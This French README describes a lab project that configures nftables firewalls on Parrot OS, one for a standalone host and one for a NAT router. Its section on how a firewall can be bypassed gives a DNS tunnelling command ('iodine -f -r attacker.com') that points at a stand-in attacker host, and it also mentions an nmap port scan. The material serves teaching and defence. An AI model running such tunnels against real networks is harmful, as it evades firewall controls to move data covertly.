Projet Firewall — Parrot OS


# Objectif du projet


Ce projet montre la configuration de pare-feu avancés sous Parrot Security OS, une distribution orientée pentest + vie privée/anonymat.



Les démonstrations se concentrent sur les niveaux :

Niveau 6 — nftables (avancé, standalone)

Niveau 7 — nftables (NAT / Lab, routeur VM)

# Pourquoi Parrot OS ?
Distribution orientée pentest + vie privée/anonymat.

Le pare-feu ufw est installé par défaut mais désactivé → à activer/configurer par l’utilisateur.

Intègre directement des outils privacy (Tor, Anonsurf, OnionShare).

Plus légère que Kali, adaptée aux machines modestes et à la virtualisation (VirtualBox, VMware).

# Niveaux de sécurité présentés
Niveau 6 — nftables avancé : politique drop par défaut, ouverture sélective (SSH, DNS, HTTP/HTTPS).

Niveau 7 — nftables NAT/Lab : le système devient routeur/firewall pour un LAN virtuel.


# Niveau 6 (standalone, machine protégée)

table inet filter {
chain input {
type filter hook input priority 0;
policy drop;

# Autoriser loopback
iif "lo" accept

# Autoriser connexions établies
ct state established,related accept

# Autoriser ping (IPv4 & IPv6)
ip protocol icmp accept
ip6 nexthdr icmpv6 accept

# Autoriser SSH + HTTP/HTTPS
tcp dport {22,80,443} accept

# Autoriser DNS
tcp dport 53 accept
udp dport 53 accept
}
}


# Niveau 7 (NAT / Lab, routeur VM)
table inet filter {
chain input {
type filter hook input priority 0;
policy drop;

iif "lo" accept
ct state established,related accept
ip protocol icmp accept
ip6 nexthdr icmpv6 accept
tcp dport {22,80,443} accept
tcp dport 53 accept
udp dport 53 accept
}

chain forward {
type filter hook forward priority 0;
policy drop;

# Autoriser le LAN interne vers Internet
iif "eth1" oif "eth0" accept
ct state established,related accept
}
}

table ip nat {
chain postrouting {
type nat hook postrouting priority 100;
oif "eth0" masquerade
}
}

# 📌 Explications :

Niveau 6 → protège ta machine personnelle.

Niveau 7 → transforme ta machine en pare-feu + routeur pour un réseau virtuel.


#  Démonstrations
Application des règles :

sudo nft -f /etc/nftables.conf

Vérification des règles actives :

sudo nft list ruleset


Tests (ping, HTTP, DNS, etc.) avec captures d’écran (GitHub + YouTube).

#  Limites et bonnes pratiques


Un firewall réduit la surface d’attaque mais ne protège pas de tout.

Un hacker expérimenté peut :

passer par un port ouvert (SSH, HTTPS),

exploiter une faille logicielle,

utiliser du tunneling (DNS, HTTP(S)),

contourner via IPv6 si mal configuré.



👉 Solution : combiner avec un IDS/IPS (Snort, Suricata), du monitoring (logs, SIEM), et de bonnes pratiques (MFA, patchs, segmentation réseau).

# Conclusion
Parrot OS est une alternative solide à Kali, plus légère et orientée vie privée.

Les niveaux 6 et 7 démontrent deux cas concrets :

🔒 Protection avancée d’une machine individuelle.

🌐 Mise en place d’un routeur/firewall complet pour un lab réseau.

Ce projet illustre comment un firewall évolue : de simple protection → à composant réseau avancé.

⚡ Technologies utilisées
Parrot OS

nftables

VirtualBox



📌 Auteur : Virginie Lechene

# ⚠️ Comment un hacker pourrait contourner


Même avec un firewall avancé (niveaux 6 et 7), il existe des techniques de contournement :

Exploiter les ports ouverts (ex : nmap -p 443 <cible> → scanner en HTTPS).

Tunneling DNS (ex : iodine → transformer DNS en canal de communication).

Exploiter des failles applicatives derrière un port autorisé.



👉 C’est pourquoi on combine firewall + IDS/IPS + monitoring.

🔹 Exemple — Tunnel DNS (contournement)


Comme le port 53 (DNS) est ouvert, un attaquant peut établir un tunnel DNS :

iodine -f -r attacker.com

👉 Cela permet de faire passer du trafic complet dans des requêtes DNS → contournant le firewall.

🚀 Différence entre Niveau 6 et Niveau 7


🔹 Niveau 6 : Firewall personnel
Ne protège que ta machine locale.

Politique stricte : tout bloqué sauf quelques services.

Idéal pour un poste de travail ou serveur isolé.



👉 Exemple : ton PC sous Parrot OS n’accepte que le trafic web et SSH.

🔹 Niveau 7 : Firewall réseau
Ta machine devient un routeur + firewall.

Protège un lab ou réseau interne entier.

Ajoute le forwarding + NAT.

Fonctionne comme un firewall d’entreprise (pfSense, Fortinet, iptables/nftables).



👉 Exemple : une VM interne passe par ton firewall pour sortir → le firewall contrôle/log tout le trafic.




